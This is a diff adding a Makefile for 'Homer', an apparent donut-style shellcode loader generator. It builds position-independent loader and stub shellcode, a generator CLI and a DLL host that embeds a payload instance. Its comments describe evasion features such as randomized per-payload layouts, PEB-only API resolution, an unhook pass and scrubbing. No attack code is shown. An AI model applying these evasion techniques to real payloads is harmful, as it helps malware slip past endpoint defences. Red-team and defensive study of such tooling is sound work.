@@ -1,0 +1,146 @@
+# Homer build system.
+#
+# Split pipeline:
+#   loaders  - position-independent loader/stub shellcode via mingw -> .text -> C headers
+#   homer    - host generator CLI (embeds the freshly built loader headers)
+#   dll      - DLL host build from a --no-pack instance (needs INSTANCE=)
+#
+# Kernels:
+#   loader/stub binaries are freestanding PIC (-nostdlib -fPIC -O0
+#   -fno-toplevel-reorder -fpack-struct=8), extracted verbatim from .text
+#   by exe2h, exactly like upstream donut's Makefile.mingw.
+
+CC32    := i686-w64-mingw32-gcc
+CC64    := x86_64-w64-mingw32-gcc
+CXX32   := i686-w64-mingw32-g++
+CXX64   := x86_64-w64-mingw32-g++
+HOSTCC  := gcc
+
+# Same defines as upstream release loaders.
+DEFS    :=
+LFLAGS  := -fno-toplevel-reorder -fpack-struct=8 -fPIC -O0 -nostdlib
+LINCLUDE := -I include
+
+# Generated artifacts live under build/ and never in the tree:
+# build/c holds generated C (.h from exe2h, layout, passes, instance),
+# build/go holds the Go byproducts exe2h emits alongside each header.
+GENDIR_C  := build/c
+GENDIR_GO := build/go
+GENINC    := -I build/c
+
+# Generator (host) build flags, mirrors upstream Linux Makefile.
+GFLAGS  := -Wunused-function -Wall -fpack-struct=8 -DDONUT_EXE -I include $(GENINC)
+
+# Layout seed for the randomized DONUT_INSTANCE layout (layer 3).
+# Any integer; regenerate layout with `make layout SEED=<n>`.
+SEED    ?= 1
+
+LOADER_SRCS := loader/entry.S loader/loader.c loader/clib.c loader/scrub.c hash.c encrypt.c
+# Operator passes: every passes/*.{c,cpp} containing HOMER_REGISTER(name, …).
+# tools/gen_passes.py emits the table; there is no runtime registry or limit.
+PASS_C_SRCS   := $(wildcard passes/*.c)
+PASS_CXX_SRCS := $(wildcard passes/*.cpp)
+PASS_CXXFLAGS := -fno-exceptions -fno-rtti -fno-threadsafe-statics
+PASS_CXX_64_OBJS := $(patsubst passes/%.cpp,build/passcxx64/%.o,$(PASS_CXX_SRCS))
+PASS_CXX_32_OBJS := $(patsubst passes/%.cpp,build/passcxx32/%.o,$(PASS_CXX_SRCS))
+# The DLL host build ships no passes by default: repointing LDR entries or
+# touching loader state inside a foreign host is the operator's explicit
+# choice (make dll DLL_PASSES="passes/foo.c").
+DLL_PASSES ?=
+# The stubs use no external functions; compiling only the stub keeps .text
+# exactly STUB_SIZE bytes so the appended body starts where the stub expects.
+STUB_SRCS   := loader/stub.c
+STUB_V2_SRCS := loader/stub_v2.c
+STUB_X86_SRCS := loader/stub_x86.c
+
+.PHONY: all loaders stubs variants homer layout dll clean
+
+all: layout loaders stubs variants homer
+
+# ---------------------------------------------------------------- layout (L3)
+layout: $(GENDIR_C)
+	python3 tools/gen_layout.py --seed $(SEED) --out $(GENDIR_C)/homer_layout.h
+
+$(GENDIR_C) $(GENDIR_GO):
+	mkdir -p $(GENDIR_C) $(GENDIR_GO)
+
+# ---------------------------------------------------------- operator passes
+# Scans passes/ for HOMER_REGISTER markers and emits the dispatch table.
+# The source gate (no direct Win32 calls: PEB only) runs here; the import
+# gate (--check-imports) runs on the linked artifact in loaders/dll.
+build/c/passes_gen.c: $(PASS_C_SRCS) $(PASS_CXX_SRCS) tools/gen_passes.py | $(GENDIR_C)
+	python3 tools/gen_passes.py --out $@ $(PASS_C_SRCS) $(PASS_CXX_SRCS)
+
+build/c/passes_gen_dll.c: tools/gen_passes.py $(DLL_PASSES) | $(GENDIR_C)
+	python3 tools/gen_passes.py --out $@ $(DLL_PASSES)
+
+build/passcxx64/%.o: passes/%.cpp build/c/passes_gen.c
+	mkdir -p build/passcxx64
+	$(CXX64) $(DEFS) $(LFLAGS) $(PASS_CXXFLAGS) $(LINCLUDE) $(GENINC) -I loader -c $< -o $@
+
+build/passcxx32/%.o: passes/%.cpp build/c/passes_gen.c
+	mkdir -p build/passcxx32
+	$(CXX32) $(DEFS) $(LFLAGS) $(PASS_CXXFLAGS) $(LINCLUDE) $(GENINC) -I loader -c $< -o $@
+
+build/dllpasscxx64/%.o: passes/%.cpp build/c/passes_gen_dll.c
+	mkdir -p build/dllpasscxx64
+	$(CXX64) $(DEFS) $(LFLAGS) $(PASS_CXXFLAGS) $(LINCLUDE) $(GENINC) -I loader -c $< -o $@
+
+DLL_PASS_CXX_OBJS := $(patsubst passes/%.cpp,build/dllpasscxx64/%.o,$(filter %.cpp,$(DLL_PASSES)))
+
+# ------------------------------------------------------------ loader headers
+# exe2h derives output names from the input basename and writes next to it,
+# so it runs with build/c as CWD; the .go byproducts move to build/go.
+build/exe2h: loader/exe2h/exe2h.c | $(GENDIR_C)
+	$(HOSTCC) -I include loader/exe2h/exe2h.c -obuild/exe2h
+
+loaders: build/exe2h build/c/passes_gen.c $(PASS_CXX_64_OBJS) $(PASS_CXX_32_OBJS) | $(GENDIR_C) $(GENDIR_GO)
+	$(CC32) $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -I loader $(LOADER_SRCS) $(PASS_C_SRCS) build/c/passes_gen.c $(PASS_CXX_32_OBJS) -obuild/loader.exe
+	(cd $(GENDIR_C) && ../exe2h ../loader.exe append-rdata && mv *.go ../go/)
+	$(CC64) $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -I loader $(LOADER_SRCS) $(PASS_C_SRCS) build/c/passes_gen.c $(PASS_CXX_64_OBJS) -obuild/loader.exe
+	(cd $(GENDIR_C) && ../exe2h ../loader.exe append-rdata && mv *.go ../go/)
+	python3 tools/gen_passes.py --check-imports build/loader.exe
+
+# ------------------------------------------------------------------ stubs (L1)
+# Generate exactly the three stub headers donut.c includes.
+stubs: build/exe2h | $(GENDIR_C) $(GENDIR_GO)
+	$(CC64) $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -DHOMER_STUB $(STUB_SRCS) -obuild/loader_stub.exe
+	(cd $(GENDIR_C) && ../exe2h ../loader_stub.exe && mv *.go ../go/)
+	$(CC64) $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -DHOMER_STUB $(STUB_V2_SRCS) -obuild/loader_stub_v2_e.exe
+	(cd $(GENDIR_C) && ../exe2h ../loader_stub_v2_e.exe && mv *.go ../go/)
+	$(CC32) $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -DHOMER_STUB $(STUB_X86_SRCS) -obuild/loader_stub_x86_.exe
+	(cd $(GENDIR_C) && ../exe2h ../loader_stub_x86_.exe && mv *.go ../go/)
+
+# per-payload layout variants (2 seeds) -> per-payload layout randomization
+variants: build/exe2h build/c/passes_gen.c $(PASS_CXX_64_OBJS) | $(GENDIR_C) $(GENDIR_GO)
+	for s in 1 2; do \
+		python3 tools/gen_layout.py --seed $$s --out $(GENDIR_C)/homer_layout_$${s}.h; \
+		$(CC64) -DHOMER_LAYOUT_HEADER=\"homer_layout_$${s}.h\" $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -I loader $(LOADER_SRCS) $(PASS_C_SRCS) build/c/passes_gen.c $(PASS_CXX_64_OBJS) -o build/v$${s}.exe; \
+		(cd $(GENDIR_C) && ../exe2h ../v$${s}.exe append-rdata && mv *.go ../go/ && mv v$${s}_exe_x64.h loader_exe_x64_v$${s}.h); \
+	done
+	python3 tools/gen_layout.py --seed $(SEED) --out $(GENDIR_C)/homer_layout.h
+
+# ------------------------------------------------------------- generator (CLI)
+homer: layout loaders stubs variants
+	$(HOSTCC) $(GFLAGS) donut.c profile.c hash.c encrypt.c format.c loader/clib.c -ohomer
+
+# ------------------------------------------------------------- DLL host build
+# INSTANCE is the --no-pack output. That file is a full PIC
+# (`E8 <len32> <instance> 59 <loader>`), so bin2h --instance embeds only the
+# instance bytes. entry.S is dropped: DllMain is the entry point.
+# The DLL ships no passes by default (see DLL_PASSES above); its table is
+# generated separately so the stock unhook pass never links into a host.
+dll: layout build/c/passes_gen_dll.c $(DLL_PASS_CXX_OBJS) | $(GENDIR_C)
+	@test -n "$(INSTANCE)" || { echo "dll: set INSTANCE=<unpacked instance file>"; exit 2; }
+	python3 tools/bin2h.py $(INSTANCE) --instance --out build/c/instance.h
+	$(CC64) $(DEFS) $(LFLAGS) $(LINCLUDE) $(GENINC) -I loader \
+	  -DHOMER_REGISTER_MODULE=0 \
+	  -shared -Wl,--entry,DllMain -Wl,--subsystem,windows -Wl,--exclude-all-symbols \
+	  loader/dll_main.c $(filter-out loader/entry.S,$(LOADER_SRCS)) $(filter %.c,$(DLL_PASSES)) $(DLL_PASS_CXX_OBJS) build/c/passes_gen_dll.c -ohomer_loader.dll
+	python3 tools/gen_passes.py --check-imports homer_loader.dll
+	@echo "built homer_loader.dll"
+
+clean:
+	rm -rf build
+	rm -f homer homer_loader.dll
+	rm -rf tools/__pycache__
